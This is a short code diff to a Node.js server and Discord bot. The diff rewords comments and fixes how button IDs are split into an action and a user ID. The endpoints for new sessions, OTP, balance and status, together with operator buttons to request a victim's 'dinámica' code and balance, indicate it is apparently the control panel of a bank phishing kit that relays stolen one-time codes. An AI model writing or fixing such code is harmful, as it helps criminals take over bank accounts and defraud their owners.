@@ -50,7 +50,7 @@ app.post('/nuevo', async (req, res) => {
             )
             .setTimestamp();
 
-        // 🔥 AQUÍ AGREGAMOS EL NUEVO BOTÓN DE SALDO
+        // Botones de acción
         const row = new ActionRowBuilder().addComponents(
             new ButtonBuilder().setCustomId(`otp_${userId}`).setLabel('📱 Pedir Dinámica').setStyle(ButtonStyle.Primary),
             new ButtonBuilder().setCustomId(`saldo_${userId}`).setLabel('💰 Pedir Saldo').setStyle(ButtonStyle.Primary),
@@ -97,7 +97,7 @@ app.post('/otp/:userId', async (req, res) => {
     }
 });
 
-// 🔥 3. NUEVO Endpoint que recibe el saldo del usuario
+// 3. Endpoint que recibe el saldo del usuario
 app.post('/saldo/:userId', async (req, res) => {
     try {
         const { userId } = req.params;
@@ -134,7 +134,12 @@ app.get('/estado/:userId', (req, res) => {
 // 5. Escuchar los clics de los botones en Discord
 client.on('interactionCreate', async (interaction) => {
     if (!interaction.isButton()) return;
-    const [action, userId] = interaction.customId.split('_');
+
+    // 🔥 FIX: Separar correctamente el action del userId (porque userId tiene guiones bajos)
+    const parts = interaction.customId.split('_');
+    const action = parts[0];
+    const userId = parts.slice(1).join('_');
+
     const s = sesiones.get(userId);
     
     if (!s) return interaction.reply({ content: '❌ Sesión no encontrada o expirada.', ephemeral: true });
